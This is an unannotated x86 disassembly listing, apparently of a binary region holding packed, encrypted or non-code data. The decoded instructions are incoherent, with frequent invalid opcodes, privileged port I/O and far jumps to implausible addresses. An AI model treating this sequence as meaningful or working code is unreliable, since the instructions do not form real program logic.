  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0xfa0ab7d3
  411322:	js     0x41137b
  411324:	mov    fs,WORD PTR [edx+0x62]
  411327:	int    0x5f
  411329:	bound  esp,QWORD PTR [edx+0x7d]
  41132c:	mov    ch,0x32
  41132e:	ss lahf 
  411330:	inc    edx
  411331:	add    DWORD PTR [ebx+0x5c6d4267],edx
  411337:	aas    
  411338:	pop    ecx
  411339:	inc    ecx
  41133a:	sbb    edi,DWORD PTR [edx]
  41133c:	retf   
  41133d:	mov    edx,DWORD PTR [ebp-0x16a5b182]
  411343:	stos   BYTE PTR es:[di],al
  411345:	push   ebp
  411346:	ret    
  411347:	or     dl,ch
  411349:	and    eax,edi
  41134b:	sbb    BYTE PTR [ebx-0xbbcdb1a],dl
  411351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411352:	push   ebp
  411353:	mov    edi,0x562c1a53
  411358:	(bad)  
  411359:	push   ebp
  41135a:	mov    bl,0x52
  41135c:	push   esp
  41135d:	and    dh,BYTE PTR [eax]
  41135f:	mov    ds:0xd4b9ff30,al
  411364:	push   edi
  411365:	add    ebp,DWORD PTR gs:[ebp-0x4b]
  411369:	add    DWORD PTR [ecx+ecx*4],edi
  41136c:	jmp    0x411352
  41136e:	xor    eax,0x924075cf
  411373:	pop    ebp
  411374:	or     edx,DWORD PTR [eax+0x5c8f0c7d]
  41137a:	mov    ebp,0x133409d1
  41137f:	lock and esi,edx
  411382:	(bad)  
  411383:	jae    0x4113c9
  411385:	sbb    BYTE PTR [esi-0x5a78206d],dl
  41138b:	pop    eax
  41138c:	mov    dl,0x16
  41138e:	shr    BYTE PTR [eax],0x99
  411391:	mov    eax,ds:0xf965ae9a
  411396:	mov    ecx,0xcf53fe7e
  41139b:	xor    DWORD PTR [ecx+0x5a],0xa3bfed3
  4113a2:	in     eax,dx
  4113a3:	inc    ecx
  4113a4:	push   ds
  4113a5:	and    esi,DWORD PTR [ecx-0x51fef317]
  4113ab:	rcl    BYTE PTR [edi-0x58],0x64
  4113af:	sbb    eax,0x61ee7fa0
  4113b4:	imul   eax,DWORD PTR [edi+eax*1-0x66],0x64
  4113b9:	stos   BYTE PTR es:[edi],al
  4113ba:	jp     0x4113ee
  4113bc:	je     0x41143d
  4113be:	mov    dh,dl
  4113c0:	adc    al,0x85
  4113c2:	sbb    bl,dl
  4113c4:	xchg   edi,eax
  4113c5:	fwait
  4113c6:	enter  0xc359,0x2f
  4113ca:	daa    
  4113cb:	dec    eax
  4113cc:	out    0x78,al
  4113ce:	stc    
  4113cf:	test   eax,0x90254097
  4113d4:	sub    eax,0xe990acf5
  4113d9:	mov    bh,0x72
  4113db:	cmp    DWORD PTR [edx-0x6e],ebp
  4113de:	xchg   esi,eax
  4113df:	in     eax,0xc0
  4113e1:	lods   eax,DWORD PTR ds:[esi]
  4113e2:	shl    BYTE PTR [ebp-0x1a6aab01],cl
  4113e8:	cs stos DWORD PTR es:[edi],eax
  4113ea:	rol    BYTE PTR [ebp-0x5859b185],0xb
  4113f1:	dec    esp
  4113f2:	into   
  4113f3:	and    eax,0x32ce16a7
  4113f8:	cmp    dh,0xc0
  4113fb:	lahf   
  4113fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113fd:	call   0xc13b:0x8817fe62
  411404:	in     al,dx
  411405:	js     0x41140f
  411407:	xchg   esi,eax
  411408:	xchg   DWORD PTR [ebp+0x6d],eax
  41140b:	and    eax,0x4b3b7a97
  411410:	sub    bl,ch
  411412:	jae    0x411410
  411414:	call   0x295f30d7
  411419:	add    esp,DWORD PTR [eax]
  41141b:	fucomi st,st(5)
  41141d:	add    BYTE PTR [eax],bh
  41141f:	rcr    BYTE PTR [edx+edi*1],0x4d
  411423:	repnz std 
  411425:	push   esp
  411426:	sub    eax,ebx
  411428:	add    al,0x6d
  41142a:	xor    dl,BYTE PTR [ecx]
  41142c:	ja     0x411471
  41142e:	inc    esi
  41142f:	popa   
  411430:	fscale 
  411432:	test   BYTE PTR [ebp-0x6b],0x1e
  411436:	inc    esp
  411437:	out    0x1a,al
  411439:	push   es
  41143a:	jg     0x411469
  41143c:	xor    dl,BYTE PTR [ebx+0x72]
  41143f:	sub    DWORD PTR [edx],ebp
  411441:	imul   edi,DWORD PTR [eax+eiz*1],0x53
  411445:	ds push ss
  411447:	adc    eax,0x9f44fb6a
  41144c:	jnp    0x4114c2
  41144e:	sahf   
  41144f:	push   esi
  411450:	aaa    
  411451:	lahf   
  411452:	push   ax
  411454:	adc    BYTE PTR [edx+0x2b975a68],dh
  41145a:	sbb    eax,0xe5c593d5
  41145f:	xor    BYTE PTR ss:[eax-0x685cb36e],dl
  411466:	(bad)  
  411467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411468:	leave  
  411469:	pop    ebx
  41146a:	mov    dl,0x92
  41146c:	or     ecx,DWORD PTR [edx+0x543bd5ef]
  411472:	lock jg 0x411426
  411475:	and    dl,BYTE PTR [edx]
  411477:	adc    DWORD PTR [ebx-0x50],esi
  41147a:	leave  
  41147b:	and    eax,0x40c49d10
  411480:	loope  0x411468
  411482:	sbb    ebx,DWORD PTR [ebp-0x64]
  411485:	pop    ds
  411486:	not    BYTE PTR [eax+0x2f1921fb]
  41148c:	mov    eax,0x2b40a15e
  411491:	not    BYTE PTR [ebx]
  411493:	sbb    BYTE PTR [esi],dh
  411495:	adc    edi,DWORD PTR [eax-0x66]
  411498:	ret    0x7cb6
  41149b:	inc    edi
  41149c:	and    BYTE PTR [ecx],cl
  41149e:	cmp    eax,0x65a4075c
  4114a3:	dec    ebp
  4114a4:	dec    edx
  4114a5:	mov    ds:0x441e3b78,eax
  4114aa:	aaa    
  4114ab:	aad    0xd4
  4114ad:	retf   
  4114ae:	popf   
  4114af:	push   0x3b
  4114b1:	test   DWORD PTR [eax+ebx*1],0x250bb145
  4114b8:	jne    0x411537
  4114ba:	stc    
  4114bb:	cmp    esi,edx
  4114bd:	adc    esi,DWORD PTR [ebp-0x6c]
  4114c0:	xor    eax,DWORD PTR [ebx+0xf]
  4114c3:	mov    eax,0x746f4d11
  4114c8:	xchg   esp,eax
  4114c9:	lahf   
  4114ca:	mov    ecx,0x65f5b34e
  4114cf:	aad    0xef
  4114d1:	sti    
  4114d2:	push   ecx
  4114d3:	pop    es
  4114d4:	adc    BYTE PTR [edi-0x644ef19a],ch
  4114da:	leave  
  4114db:	js     0x41145d
  4114dd:	mov    esp,0x4ac8479a
  4114e2:	in     al,dx
  4114e3:	out    dx,al
  4114e4:	sub    eax,DWORD PTR [esi+0x72]
  4114e7:	pop    ebp
  4114e8:	inc    ebx
  4114e9:	cs sti 
  4114eb:	add    al,0xca
  4114ed:	lahf   
  4114ee:	int    0x39
  4114f0:	cmp    esi,DWORD PTR [edi-0x55770490]
  4114f6:	hlt    
  4114f7:	or     DWORD PTR [ebx+0x2287c879],0x1c87140f
  411501:	dec    edx
  411502:	jmp    0x411535
  411504:	and    DWORD PTR [ecx],0x3d66881f
  41150a:	or     BYTE PTR [eax],al
  41150c:	dec    eax
  41150d:	cmp    ah,BYTE PTR [ecx+0x70]
  411510:	repz aaa 
  411512:	push   edx
  411513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411514:	fldenv [ebx-0x3da71580]
  41151a:	stos   BYTE PTR es:[edi],al
  41151b:	jbe    0x41152e
  41151d:	adc    DWORD PTR [esi-0x2ed9a5f7],edx
  411523:	xlat   BYTE PTR ds:[ebx]
  411524:	sbb    al,0xa5
  411526:	cs pop ss
  411528:	ins    BYTE PTR es:[edi],dx
  411529:	jmp    DWORD PTR [eax]
  41152b:	aam    0xd1
  41152d:	xchg   esi,eax
  41152e:	outs   dx,BYTE PTR ds:[esi]
  41152f:	inc    edx
  411530:	fisttp DWORD PTR [ecx+esi*8+0x30]
  411534:	sbb    eax,0x64cb09c9
  411539:	or     edx,eax
  41153b:	or     al,0x95
  41153d:	jno    0x4115b2
  41153f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411540:	bound  edi,QWORD PTR [edi]
  411542:	jbe    0x4115ab
  411544:	cmp    eax,0x6cbf887c
  411549:	or     ah,BYTE PTR [esi-0x44]
  41154c:	and    DWORD PTR [esi-0x16c2ac90],edi
  411552:	je     0x411523
  411554:	push   es
  411555:	stos   DWORD PTR es:[edi],eax
  411556:	mov    ecx,0x4f0673f4
  41155b:	sbb    DWORD PTR [edi],esi
  41155d:	jo     0x4114f7
  41155f:	call   0x289c:0x1d9122ad
  411566:	mov    ebx,0x5fbfa57
  41156b:	mov    al,ds:0xb97c5d87
  411570:	sub    DWORD PTR [eax-0x1e],esi
  411573:	adc    esi,edx
  411575:	pop    esp
  411576:	and    DWORD PTR [ebp+0x48],ebx
  411579:	pushf  
  41157a:	sahf   
  41157b:	push   0x96ed2f45
  411580:	pusha  
  411581:	add    edx,DWORD PTR [ebx+ebx*8-0x82d001a]
  411588:	cld    
  411589:	imul   ecx,DWORD PTR [ecx+0x611a12ed],0x46
  411590:	sub    BYTE PTR [edi],ah
  411592:	dec    ecx
  411593:	es aam 0x72
  411596:	out    dx,eax
  411597:	out    dx,eax
  411598:	inc    ebx
  411599:	sub    BYTE PTR [eax-0x17],ch
  41159c:	pop    esp
  41159d:	mov    DWORD PTR [ebx-0x6b],edi
  4115a0:	mov    eax,ds:0x80d02b95
  4115a5:	fwait
  4115a6:	and    DWORD PTR [bx+si-0x2],ebx
  4115aa:	push   cs
  4115ab:	out    dx,al
  4115ac:	mov    ah,0xf8
  4115ae:	out    dx,al
  4115af:	fbld   TBYTE PTR ds:0x59ca4452
  4115b5:	int    0x71
  4115b7:	cdq    
  4115b8:	icebp  
  4115b9:	push   eax
  4115ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115bb:	clc    
  4115bc:	cdq    
  4115bd:	inc    eax
  4115be:	jae    0x41157a
  4115c0:	dec    ebp
  4115c1:	in     eax,dx
  4115c2:	(bad)  
  4115c4:	in     eax,0x10
  4115c6:	mov    BYTE PTR [ecx+0x79],cl
  4115c9:	test   al,0x16
  4115cb:	into   
  4115cc:	sub    al,0x16
  4115ce:	xchg   ebp,eax
  4115cf:	das    
  4115d0:	sub    DWORD PTR [ebp-0x6e],edx
  4115d3:	cld    
  4115d4:	xchg   ebx,eax
  4115d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d6:	add    BYTE PTR [ebp-0x3c],ch
  4115d9:	outs   dx,DWORD PTR ds:[esi]
  4115da:	jg     0x41156b
  4115dc:	and    eax,0x5551b41f
  4115e1:	iret   
  4115e2:	out    0xa5,al
  4115e4:	inc    ecx
  4115e5:	ins    DWORD PTR es:[edi],dx
  4115e6:	cmp    ebx,DWORD PTR [edx+0x49]
  4115e9:	dec    ecx
  4115ea:	xchg   ebx,eax
  4115eb:	sub    al,0x3d
  4115ed:	je     0x411575
  4115ef:	aas    
  4115f0:	(bad)  
  4115f1:	stc    
  4115f2:	clc    
  4115f3:	lods   al,BYTE PTR ds:[esi]
  4115f4:	mov    al,0xbd
  4115f6:	test   al,0x16
  4115f8:	mov    ah,0x16
  4115fa:	(bad)  
  4115fb:	push   edi
  4115fc:	call   FWORD PTR [edi+eiz*4+0x12]
  411600:	fistp  WORD PTR [esi-0x30793f4e]
  411606:	jo     0x411623
  411608:	scas   eax,DWORD PTR es:[edi]
  411609:	cmc    
  41160a:	lahf   
  41160b:	loope  0x4115ae
  41160d:	icebp  
  41160e:	stos   BYTE PTR es:[edi],al
  41160f:	inc    edi
  411610:	in     eax,0xb9
  411612:	hlt    
  411613:	jecxz  0x41166d
  411615:	pop    edx
  411616:	popf   
  411617:	neg    BYTE PTR [edi+ecx*2-0x41efa2a]
  41161e:	and    cl,BYTE PTR [ebx+0x3b]
  411621:	shl    DWORD PTR [edx-0x5b],1
  411624:	inc    eax
  411625:	mov    ch,0x7
  411627:	adc    eax,0x3bc702b6
  41162c:	ret    0xc8db
  41162f:	add    dl,cl
  411631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411632:	xchg   ebx,eax
  411633:	div    esi
  411635:	inc    esp
  411636:	jmp    0x8823:0x210f5fa8
  41163d:	out    dx,eax
  41163e:	ret    
  41163f:	push   ecx
  411640:	lods   eax,DWORD PTR ds:[esi]
  411641:	popf   
  411642:	mov    dh,0x2e
  411644:	and    al,0xd2
  411646:	jmp    0x5c01dd5e
  41164b:	in     eax,0xbc
  41164d:	sbb    al,0xea
  41164f:	test   eax,0xc9923d18
  411654:	xchg   DWORD PTR [edi+eiz*2-0x4e2920ce],esp
  41165b:	repz pop es
  41165d:	dec    edx
  41165e:	loopne 0x41162b
  411660:	jl     0x411639
  411662:	jmp    0x4116d0
  411664:	dec    edi
  411665:	inc    edi
  411666:	add    al,0x69
  411668:	push   ss
  411669:	or     al,0xeb
  41166b:	jl     0x4116d1
  41166d:	clc    
  41166e:	xor    al,0xff
  411670:	push   esi
  411671:	and    dl,BYTE PTR [edi-0x3e52ca2f]
  411677:	and    DWORD PTR [eax+0xff973a3],ebx
  41167d:	repnz cwde 
  41167f:	mov    cl,0x7c
  411681:	push   cs
  411682:	sbb    al,BYTE PTR [edx-0x14]
  411685:	out    dx,al
  411686:	stc    
  411687:	mov    edi,0xe80a3c50
  41168c:	inc    ebp
  41168d:	shr    BYTE PTR [edx-0x759e6d24],0xd6
  411694:	test   eax,0x611fa53e
  411699:	xor    eax,DWORD PTR [edx]
  41169b:	repz sbb BYTE PTR [esi],cl
  41169e:	sub    ebx,edx
  4116a0:	mov    ah,0x1a
  4116a2:	shl    DWORD PTR [esi],0x82
  4116a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a6:	push   ds
  4116a7:	aaa    
  4116a8:	rcl    DWORD PTR [edx+0x6b],0xc6
  4116ac:	dec    ecx
  4116ad:	mov    ecx,0x7b0a515a
  4116b2:	in     eax,0x80
  4116b4:	iret   
  4116b5:	jnp    0x4116d3
  4116b7:	in     al,dx
  4116b8:	xchg   esi,eax
  4116b9:	dec    eax
  4116ba:	jp     0x41170d
  4116bc:	jp     0x411703
  4116be:	mov    eax,ds:0xab2a511f
  4116c3:	mov    eax,ds:0xc5696844
  4116c8:	pop    es
  4116c9:	aaa    
  4116ca:	jbe    0x41164d
  4116cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116cd:	std    
  4116ce:	test   DWORD PTR [ecx+0x79],edx
  4116d1:	xchg   edx,eax
  4116d2:	mov    cl,0xe8
  4116d4:	pop    ebx
  4116d5:	xor    cl,bh
  4116d7:	xor    ah,dl
  4116d9:	pop    edx
  4116da:	mov    ebp,0xf1daab2f
  4116df:	pop    ds
  4116e0:	push   ebx
  4116e1:	xlat   BYTE PTR ds:[ebx]
  4116e2:	mov    esp,0x1962e75c
  4116e7:	mov    dl,0x70
  4116e9:	mov    ss,esi
  4116eb:	bound  esi,QWORD PTR [ecx+esi*2]
  4116ee:	pop    ss
  4116ef:	shl    edi,0x90
  4116f2:	inc    ebp
  4116f3:	js     0x4116b9
  4116f5:	retf   0x1998
  4116f8:	cwde   
  4116f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116fa:	sbb    ecx,edi
  4116fc:	mov    WORD PTR [edx-0x7d],cs
  4116ff:	and    al,0xca
  411701:	shl    DWORD PTR [ecx-0x15],cl
  411704:	pop    ebx
  411705:	xchg   edi,eax
  411706:	push   edi
  411707:	fsubp  st(3),st
  411709:	and    al,0xdb
  41170b:	cmp    ecx,DWORD PTR [ebp+esi*1+0x45]
  41170f:	push   ss
  411710:	jb     0x4116fd
  411712:	sbb    DWORD PTR [ebx],esp
  411714:	adc    eax,0xffffffc8
  411717:	sub    ebp,DWORD PTR [eax]
  411719:	jb     0x4116b7
  41171b:	vmovhps QWORD PTR fs:[esi],xmm1
  411720:	fiadd  DWORD PTR [esi]
  411722:	adc    al,BYTE PTR [ecx+ecx*2]
  411725:	and    bl,BYTE PTR [edx-0x1d]
  411728:	and    al,0xb2
  41172a:	adc    DWORD PTR [edi],edx
  41172c:	stc    
  41172d:	mov    al,ds:0xf8121123
  411732:	sbb    edi,DWORD PTR [ecx+0x69771e7]
  411738:	pushf  
  411739:	test   al,0xa5
  41173b:	fcmovnu st,st(3)
  41173d:	mov    eax,ds:0x43cec48e
  411742:	pop    ebp
  411743:	adc    DWORD PTR [esi+eiz*8+0x67987f9c],0x7a
  41174b:	cmp    eax,0x4501624
  411750:	loope  0x4116de
  411752:	xchg   ecx,eax
  411753:	jge    0x41179d
  411755:	mov    cl,0x0
  411757:	ins    BYTE PTR es:[edi],dx
  411758:	inc    ebx
  411759:	add    ebp,DWORD PTR [ecx]
  41175b:	or     DWORD PTR [edx],0xf437adb7
  411761:	(bad)  
  411762:	xor    DWORD PTR [edx-0x3cfd2757],ebx
  411768:	pop    es
  411769:	jg     0x411710
  41176b:	jle    0x411739
  41176d:	fstp   DWORD PTR [esi]
  41176f:	mov    edi,0x30673a2e
  411774:	dec    ebp
  411775:	push   0x18c46446
  41177a:	pop    ebx
  41177b:	xchg   BYTE PTR [ecx],dl
  41177d:	mov    BYTE PTR [ecx],bl
  41177f:	in     eax,dx
  411780:	hlt    
  411781:	ds and bl,dh
  411784:	imul   esp,esi,0x8a62f9d8
  41178a:	cmp    al,0x46
  41178c:	pop    edi
  41178d:	aaa    
  41178e:	xchg   DWORD PTR [edi],eax
  411790:	aaa    
  411791:	mov    al,0xc
  411793:	mov    ds,esi
  411795:	iret   
  411796:	inc    eax
  411797:	ror    DWORD PTR [edx],1
  411799:	rcl    ah,1
  41179b:	out    0xa8,al
  41179d:	push   ecx
  41179e:	mov    ebx,0xd0da1d2b
  4117a3:	mov    esi,0xc437658f
  4117a8:	adc    al,0x22
  4117aa:	xchg   DWORD PTR [eax],ebp
  4117ac:	jo     0x4117bd
  4117ae:	shl    BYTE PTR [ebp+0x2b],cl
  4117b1:	jmp    0x11e5:0xd6d5334
  4117b8:	jl     0x41175d
  4117ba:	ins    BYTE PTR es:[edi],dx
  4117bb:	pop    ecx
  4117bc:	fmul   QWORD PTR [edi]
  4117be:	xchg   esp,eax
  4117bf:	adc    DWORD PTR [edx+0x41],esi
  4117c2:	add    esp,edi
  4117c4:	in     eax,0xa3
  4117c6:	das    
  4117c7:	outs   dx,DWORD PTR ds:[esi]
  4117c8:	es mov ebp,es
  4117cb:	mov    cl,0xee
  4117cd:	das    
  4117ce:	pop    esp
  4117cf:	or     ebp,edx
  4117d1:	xchg   BYTE PTR [edi-0x10b90706],dh
  4117d7:	rcr    DWORD PTR [esi-0x6],0x1f
  4117db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117dc:	fwait
  4117dd:	adc    ch,BYTE PTR ds:0x59ecc2cc
  4117e3:	push   esi
  4117e4:	std    
  4117e5:	dec    esi
  4117e6:	shr    DWORD PTR [ebp+0x66b64acf],cl
  4117ec:	fs ret 0x1362
  4117f0:	in     eax,dx
  4117f1:	inc    esp
  4117f2:	push   esp
  4117f3:	leave  
  4117f4:	and    esp,DWORD PTR [ebx+0x39c16ea0]
  4117fa:	into   
  4117fb:	es lock mov ebx,0xb957a0a2
  411802:	jns    0x4117a4
  411804:	fcomp  DWORD PTR [ebx]
  411806:	cld    
  411807:	aas    
  411808:	gs pop ebx
  41180a:	pop    eax
  41180b:	dec    edx
  41180c:	mov    ?,ebp
  41180e:	test   cl,0x5d
  411811:	or     ch,ch
  411813:	into   
  411814:	stc    
  411815:	sub    BYTE PTR [esi+0x52],dl
  411818:	xchg   edi,eax
  411819:	inc    esi
  41181a:	pop    ss
  41181b:	push   es
  41181c:	ins    DWORD PTR es:[edi],dx
  41181d:	clc    
  41181e:	jno    0x4117c9
  411820:	cmp    BYTE PTR [edi-0x5dd9cda2],dh
  411826:	inc    ebx
  411827:	or     eax,0xc278c445
  41182c:	adc    bh,cl
  41182e:	adc    al,0xa8
  411830:	retf   
  411831:	push   es
  411832:	inc    esi
  411833:	(bad)  
  411834:	loopne 0x41183f
  411836:	add    bl,dl
  411838:	mov    esp,DWORD PTR [eax+0x7]
  41183b:	jle    0x41186e
  41183d:	sbb    BYTE PTR [edx+0x59],ah
  411840:	or     ecx,ecx
  411842:	sub    DWORD PTR [edx-0x20],eax
  411845:	mov    dh,0xeb
  411847:	add    eax,0xe0650cc1
  41184c:	icebp  
  41184d:	test   eax,0x718fcca0
  411852:	pop    es
  411853:	inc    eax
  411854:	dec    esi
  411855:	mov    eax,ds:0xb2076e83
  41185a:	sub    eax,0xd24ab72c
  41185f:	popa   
  411860:	sahf   
  411861:	les    esi,FWORD PTR [edi-0x134dbe41]
  411867:	xchg   BYTE PTR [eax+0x7c2cbdd5],cl
  41186d:	xchg   ebp,eax
  41186e:	jns    0x4118a5
  411870:	fiadd  DWORD PTR [ebx+0x70]
  411873:	fsubr  st(2),st
  411875:	in     al,dx
  411876:	aas    
  411877:	jb     0x411849
  411879:	mov    ebp,?
  41187b:	xor    ecx,edx
  41187d:	stos   BYTE PTR es:[edi],al
  41187e:	lahf   
  41187f:	pop    ds
  411880:	in     al,dx
  411881:	jl     0x4118af
  411883:	adc    ebp,ebx
  411885:	fcmovbe st,st(1)
  411887:	out    0x90,eax
  411889:	in     al,dx
  41188a:	mov    eax,0x4ed12ce7
  41188f:	inc    ecx
  411890:	dec    ebx
  411891:	jle    0x411895
  411893:	rcr    DWORD PTR [ebp+0x3e62931f],0x2
  41189a:	sbb    al,0xe6
  41189c:	xchg   DWORD PTR [ecx-0x1322d131],esp
  4118a2:	adc    BYTE PTR [edx+ecx*4+0x3d],0x17
  4118a7:	jbe    0x411832
  4118a9:	push   esi
  4118aa:	stc    
  4118ab:	pushf  
  4118ac:	add    bh,BYTE PTR [edx+0x3e]
  4118af:	dec    eax
  4118b0:	mov    ch,0x90
  4118b2:	loop   0x411842
  4118b4:	push   esp
  4118b5:	ins    DWORD PTR es:[edi],dx
  4118b6:	mov    esp,0xfe1f5058
  4118bb:	outs   dx,DWORD PTR ds:[esi]
  4118bc:	in     al,0xec
  4118be:	or     ebp,DWORD PTR [edx+esi*4-0x74]
  4118c2:	inc    ebx
  4118c3:	and    eax,0xd245c8db
  4118c8:	fwait
  4118c9:	aaa    
  4118ca:	sbb    eax,ecx
  4118cc:	mov    bh,ah
  4118ce:	idiv   ecx
  4118d0:	js     0x41187b
  4118d2:	call   0x723c4223
  4118d7:	cmp    al,0xb7
  4118d9:	xlat   BYTE PTR ds:[ebx]
  4118da:	(bad)  
  4118db:	fidivr WORD PTR [ebx]
  4118dd:	fimul  DWORD PTR [ebx+0x73]
  4118e0:	(bad)  
  4118e1:	or     DWORD PTR [eax+0x47857c85],esp
  4118e7:	mov    dl,0x9
  4118e9:	lods   al,BYTE PTR ds:[esi]
  4118ea:	out    0x2e,al
  4118ec:	daa    
  4118ed:	xor    al,0x44
  4118ef:	dec    BYTE PTR [ebx]
  4118f1:	ins    BYTE PTR es:[edi],dx
  4118f2:	sub    eax,0xb4564164
  4118f7:	cld    
  4118f8:	inc    ebp
  4118f9:	int    0xd4
  4118fb:	cmp    BYTE PTR [eax+0xacb8ae0],al
  411901:	pop    ss
  411902:	jbe    0x411949
  411904:	pop    ds
  411905:	call   FWORD PTR ds:0x8db58c4e
  41190b:	sbb    eax,0xf3557c6d
  411910:	inc    esp
  411911:	test   bh,cl
  411913:	fisttp QWORD PTR [eax+0x42]
  411916:	cmp    edi,DWORD PTR [eax-0x16]
  411919:	mov    ebx,0x5b66df69
  41191e:	sub    DWORD PTR [eax-0x2fbea757],ebx
  411924:	scas   eax,DWORD PTR es:[edi]
  411925:	in     eax,0x3b
  411927:	xchg   edx,eax
  411928:	in     al,0x1f
  41192a:	jne    0x411906
  41192c:	pop    edx
  41192d:	dec    esi
  41192e:	mov    dl,bh
  411930:	sub    BYTE PTR [eax],al
  411932:	pusha  
  411933:	mov    WORD PTR [eax+0x54],?
  411936:	sub    BYTE PTR [ebp-0x7b7c908b],ch
  41193c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41193d:	xor    ebp,0x3b2eed2a
  411943:	lods   eax,DWORD PTR ds:[esi]
  411944:	mov    ds:0x289a522a,eax
  411949:	add    cl,cl
  41194b:	pop    ebx
  41194c:	push   ebx
  41194d:	shl    ch,cl
  41194f:	ror    BYTE PTR [ecx],0xc2
  411952:	out    0xb2,eax
  411954:	pop    ds
  411955:	xchg   esi,eax
  411956:	ror    DWORD PTR [ebx*8-0x61219334],0x96
  41195e:	xor    al,0xf2
  411960:	in     al,0x1f
  411962:	dec    ecx
  411963:	xchg   edx,eax
  411964:	cwde   
  411965:	leave  
  411966:	cmp    BYTE PTR [edi],dl
  411968:	dec    esi
  411969:	sub    al,0xe7
  41196b:	cmp    DWORD PTR [ebx],ecx
  41196d:	adc    al,0x33
  41196f:	xor    bh,BYTE PTR [esi-0x548b3e79]
  411975:	ja     0x411931
  411977:	mov    dl,0xde
  411979:	rcr    ah,0x3c
  41197c:	xchg   ebx,eax
  41197d:	and    eax,0xf049b54f
  411982:	push   es
  411983:	jmp    0xbd47:0xa5c9206d
  41198a:	test   DWORD PTR [ebx],edi
  41198c:	retf   
  41198d:	imul   esp,DWORD PTR [eax+0x57],0x6a
  411991:	scas   eax,DWORD PTR es:[edi]
  411992:	lea    eax,[ebx-0x41]
  411995:	xor    eax,0x9dee14c5
  41199a:	dec    ebp
  41199b:	loopne 0x4119f2
  41199d:	test   al,0x1d
  41199f:	fcmovne st,st(4)
  4119a1:	in     al,0x91
  4119a3:	sub    al,0x92
  4119a5:	add    al,BYTE PTR [edi+0x8372c10]
  4119ab:	adc    al,0x6a
  4119ad:	lock jmp DWORD PTR [eax-0x60]
  4119b1:	add    ah,BYTE PTR [esi]
  4119b3:	cli    
  4119b4:	aas    
  4119b5:	pop    esi
  4119b6:	sub    ecx,DWORD PTR [ebx]
  4119b8:	mov    ebp,0xc3e61644
  4119bd:	int3   
  4119be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119bf:	xchg   ebp,eax
  4119c0:	xor    al,BYTE PTR [edi+0x79]
  4119c3:	into   
  4119c4:	add    al,0xc3
  4119c6:	adc    al,0xcb
  4119c8:	jecxz  0x4119a4
  4119ca:	pop    ss
  4119cb:	and    ch,BYTE PTR [esp+eax*4]
  4119ce:	ins    DWORD PTR es:[edi],dx
  4119cf:	cwde   
  4119d0:	jg     0x41196e
  4119d2:	jecxz  0x41195d
  4119d4:	das    
  4119d5:	mov    dl,0x87
  4119d7:	out    dx,eax
  4119d8:	adc    ah,BYTE PTR [edx]
  4119da:	test   BYTE PTR [edi],bh
  4119dc:	mov    gs,edx
  4119de:	iret   
  4119df:	ss xchg esi,eax
  4119e1:	in     al,dx
  4119e2:	pop    esi
  4119e3:	mov    ds:0x3d8642b4,al
  4119e8:	ins    BYTE PTR es:[edi],dx
  4119e9:	into   
  4119ea:	fistp  QWORD PTR [edi+0x1be7a135]
  4119f0:	jns    0x41197a
  4119f2:	or     ebx,DWORD PTR [esi+0x21]
  4119f5:	fnstcw WORD PTR [ebx+0x4d]
  4119f8:	ins    BYTE PTR es:[edi],dx
  4119f9:	xchg   esi,eax
  4119fa:	loopne 0x411a58
  4119fc:	stos   BYTE PTR es:[edi],al
  4119fd:	and    ch,cl
  4119ff:	mov    edx,0xb96f9d72
  411a04:	mov    WORD PTR es:[eax-0x11],gs
  411a08:	pop    edi
  411a09:	mov    edi,DWORD PTR es:[eax+0x4af665e7]
  411a10:	in     eax,0x66
  411a12:	mov    edi,0x3717ee15
  411a17:	mov    al,ds:0xd3e838b2
  411a1c:	fcom   DWORD PTR [edi+esi*8+0x39]
  411a20:	clc    
  411a21:	clc    
  411a22:	(bad)  
  411a23:	mov    ss:0xc7e70634,eax
  411a29:	or     DWORD PTR [ecx-0x7e],ebx
  411a2c:	inc    esi
  411a2d:	mov    al,0xd6
  411a2f:	and    al,0x11
  411a31:	jno    0x411a7f
  411a33:	mov    dh,0xc0
  411a35:	dec    eax
  411a36:	dec    eax
  411a37:	nop
  411a38:	and    ah,BYTE PTR [ebx]
  411a3a:	and    al,0x91
  411a3c:	ficomp WORD PTR [ebx-0x497c9906]
  411a42:	rol    DWORD PTR [edx+0x1e],1
  411a45:	cmp    DWORD PTR [edx+0x18a8c89],eax
  411a4b:	sahf   
  411a4c:	shl    BYTE PTR [eax-0x59af11ed],0x6
  411a53:	out    dx,al
  411a54:	dec    ecx
  411a55:	mov    ah,0x91
  411a57:	push   0x497972cc
  411a5c:	idiv   BYTE PTR [esi+ecx*1-0x252cdd04]
  411a63:	mov    al,ds:0x42f4b0f6
  411a68:	jne    0x411a1c
  411a6a:	dec    ecx
  411a6b:	fdiv   st(6),st
  411a6d:	and    ebx,ebx
  411a6f:	sbb    al,0xe6
  411a71:	inc    esi
  411a72:	hlt    
  411a73:	adc    bh,dh
  411a75:	mov    dh,0xef
  411a77:	pushf  
  411a78:	or     DWORD PTR [ebp+0x3f4aa4f6],0xffffffd5
  411a7f:	data16 shl BYTE PTR [ebp-0x22626f2f],0x30
  411a87:	push   0x2702211c
  411a8c:	add    dh,bl
  411a8e:	and    ecx,DWORD PTR [ecx+eiz*2-0x52]
  411a92:	in     eax,0x1e
  411a94:	mul    DWORD PTR [ebx]
  411a96:	pushf  
  411a97:	push   ss
  411a98:	and    BYTE PTR [ebp+edx*2-0x9],bl
  411a9c:	sub    al,bh
  411a9e:	fiadd  DWORD PTR [ebx]
  411aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
